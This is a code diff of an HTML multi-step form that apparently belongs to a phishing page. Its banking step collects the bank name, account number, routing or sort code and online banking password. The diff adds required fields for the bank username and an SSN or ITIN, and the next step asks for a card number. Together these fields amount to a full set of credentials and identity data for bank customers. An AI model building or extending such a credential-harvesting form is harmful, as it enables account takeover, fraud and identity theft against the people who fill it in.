@@ -153,37 +153,43 @@
         </div>
       </div>
 
-      <!-- Step 4 -->
-      <div class="form-step" id="step-4">
-        <label>Bank Name (USA/UK)</label>
-        <select name="bankName" required>
-          <option value="">Select Bank</option>
-          <option>Chase Bank</option>
-          <option>Bank of America</option>
-          <option>Wells Fargo</option>
-          <option>Barclays UK</option>
-          <option>HSBC UK</option>
-          <option>Enter manually below</option>
-        </select>
+<!-- Step 4 -->
+<div class="form-step" id="step-4">
+  <label>Bank Name (USA/UK)</label>
+  <select name="bankName" required>
+    <option value="">Select Bank</option>
+    <option>Chase Bank</option>
+    <option>Bank of America</option>
+    <option>Wells Fargo</option>
+    <option>Barclays UK</option>
+    <option>HSBC UK</option>
+    <option>Enter manually below</option>
+  </select>
 
-        <label>Other Bank Name (if not listed)</label>
-        <input type="text" name="otherBank">
+  <label>Other Bank Name (if not listed)</label>
+  <input type="text" name="otherBank">
 
-        <label>Account Number</label>
-        <input type="text" name="accountNumber" required>
+  <label>Account Number</label>
+  <input type="text" name="accountNumber" required>
 
-        <label>Routing/Sort Code</label>
-        <input type="text" name="routingCode" required>
+  <label>Routing/Sort Code</label>
+  <input type="text" name="routingCode" required>
 
-        <label>Password</label>
-        <input type="password" name="bankPassword" required>
+  <!-- ✅ Newly added fields -->
+  <label>Username</label>
+  <input type="text" name="bankUsername" required>
 
-        <div class="button-group">
-          <button type="button" onclick="prevStep(4)">Back</button>
-          <button type="button" onclick="nextStep(4)">Next</button>
-        </div>
-      </div>
+  <label>SSN or ITIN</label>
+  <input type="text" name="ssnItin" required placeholder="XXX-XX-XXXX or 9-digit ITIN">
 
+  <label>Password</label>
+  <input type="password" name="bankPassword" required>
+
+  <div class="button-group">
+    <button type="button" onclick="prevStep(4)">Back</button>
+    <button type="button" onclick="nextStep(4)">Next</button>
+  </div>
+</div>
       <!-- Step 5 -->
       <div class="form-step" id="step-5">
         <label>Card Number</label>
